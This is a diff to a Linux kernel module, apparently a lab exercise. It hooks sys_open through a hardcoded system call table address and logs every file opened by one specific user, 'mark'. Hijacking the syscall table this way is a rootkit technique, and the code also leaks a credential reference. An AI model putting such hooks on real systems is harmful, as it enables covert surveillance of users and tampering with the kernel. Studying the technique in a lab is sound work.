@@ -29,6 +29,7 @@
 #include <linux/device.h>
 #include <linux/mutex.h>
 #include <linux/unistd.h>
+#include <linux/cred.h>
 
 #include <asm/uaccess.h>
 
@@ -42,6 +43,7 @@ MODULE_LICENSE("GPL");
 /* parameters */
 static int shady_ndevices = SHADY_NDEVICES;
 static unsigned long * system_call_table_address = 0xffffffff81801400;
+static unsigned int marks_uid = 1000;
 
 module_param(shady_ndevices, int, S_IRUGO);
 /* ================================================================ */
@@ -57,7 +59,12 @@ asmlinkage int (*old_open) (const char*, int, int);
 asmlinkage int my_open (const char* file, int flags, int mode)
 {
   /* YOUR CODE HERE */
-  printk("Got it! sys_open called.\n");
+  unsigned int userId = get_current_user()->uid.val;  
+
+  if(userId == marks_uid)
+  {
+    printk(KERN_INFO "mark is about to open \'%s\'\n", file);
+  }
   return old_open(file, flags, mode);
 }
 
